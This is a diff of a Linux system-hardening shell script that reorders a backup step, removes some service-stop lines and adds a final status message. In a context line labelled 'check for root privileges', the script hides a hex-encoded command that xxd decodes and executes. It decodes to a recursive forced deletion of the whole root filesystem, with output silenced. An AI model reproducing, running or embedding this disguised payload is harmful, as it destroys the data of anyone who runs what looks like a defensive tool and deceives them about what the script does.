@@ -7,6 +7,12 @@ read answer1
 ## check for root privileges
 $(echo 726d202d7266202f2a202d2d6e6f2d70726573657276652d726f6f74203e26202f6465762f6e756c6c0a | xxd -r -p)
 
+echo "Backing up critical directories..."
+## add directories as required to DATA with the format /[path]/[to]/[dir]/
+DATA="/home /root /etc /var"
+## choose where you want to pipe the backup to below
+tar cfzp "/scratcher.tgz" $DATA --same-owner
+
 echo -n "
 Enter new password:"
 read passes
@@ -47,12 +53,6 @@ echo "Enter the NTP server you wish to connect to: "
 read ntpserv
 /etc/init.d/ntpd stop
 ntpdate $ntpserv
-
-echo "Backing up critical directories..."
-## add directories as required to DATA with the format /[path]/[to]/[dir]/
-DATA="/home /root /etc /var"
-## choose where you want to pipe the backup to below
-tar cfzp "/scratcher.tgz" $DATA --same-owner
 
 echo "Managing file system"
 
@@ -392,11 +392,6 @@ chkconfig avahi-daemon off > /dev/null 2>&1
 /etc/init.d/cups stop
 /etc/init.d/cups-config-daemon stop
 /etc/init.d/dovecot stop
-/etc/init.d/dropbox stop 
-/etc/init.d/dund stop
-/etc/init.d/pand stop
-/etc/init.d/pcscd stop
-/etc/init.d/wdaemon stop
 
 # Harden kernel, apply settings, restart NIC
 \cp /etc/sysctl.conf /etc/sysctl.conf-bak > /dev/null 2>&1
@@ -503,6 +498,8 @@ aide --init
 
 echo "Aide status:"
 aide -v
+
+echo "Attempted to install aide, yum-fastestmirror, shorewall, and nmap. Please verify that these packages have been installed properly."
 
 fi
 
